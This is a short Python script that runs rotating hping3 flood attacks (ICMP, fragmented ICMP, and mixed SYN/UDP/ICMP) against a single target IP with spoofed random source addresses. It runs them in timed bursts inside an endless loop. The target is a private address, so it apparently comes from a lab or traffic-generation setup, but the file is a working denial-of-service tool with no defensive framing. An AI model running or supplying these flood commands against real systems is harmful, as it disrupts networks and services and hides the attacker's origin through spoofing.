import subprocess
import random
import time
import signal

def run_icmp_attack(target_ip):
    print(f"Starting ICMP Attacks on {target_ip}...")

    icmp_attacks = [
        # f"hping3 -1 --flood {target_ip}",
        # f"hping3 -1 --flood --frag -d {random.randint(5, 124)} {target_ip}",
        # f"hping3 -1 -d {random.randint(600, 5600)} --flood {target_ip}",
        # f"hping3 -1 -d {random.randint(100, 600)} --flood {target_ip}"

      f"hping3 -1 -d {random.randint(600, 5600)} --flood --rand-source {target_ip}",
      f"hping3 -1 --flood --frag -d {random.randint(5, 124)} --rand-source {target_ip}",
      f"hping3 -S --udp --icmp --flood --rand-source {target_ip}",
      f"hping3 -1 --flood --rand-source {target_ip}"
    ]

    # Uncomment to include additional ICMP attack variations
    # icmp_attacks.extend([
    #     f"hping3 -1 -d {random.randint(600, 5600)} --flood --rand-source {target_ip}",
    #     f"sudo hping3 -1 --flood --frag -d {random.randint(5, 124)} --rand-source {target_ip}",
    #     f"hping3 -S --udp --icmp --flood --rand-source {target_ip}",
    #     f"hping3 -1 --flood --rand-source {target_ip}"
    # ])

    try:
        i = 0
        while True:
            # sleep_intervals = [random.randint(5, 15), random.randint(15, 35), random.randint(35, 60)]
            random_attack = random.choice(icmp_attacks)

            # print(f"Executing: {random_attack} for {sleep_intervals[i]} seconds...")
            process = subprocess.Popen(random_attack, shell=True, preexec_fn=lambda: signal.signal(signal.SIGPIPE, signal.SIG_DFL))

            time.sleep(2)

            # time.sleep(sleep_intervals[i])
            # i += 1

            # if i == 3:
            #     i = 0

            process.terminate()
            # subprocess.call("killall hping3", shell=True)
            
            time.sleep(8)
    except KeyboardInterrupt:
        print("ICMP Attacks Stopped!")

if __name__ == "__main__":
    TARGET_IP = "172.30.0.2"  # Replace with the actual target IP
    run_icmp_attack(TARGET_IP)
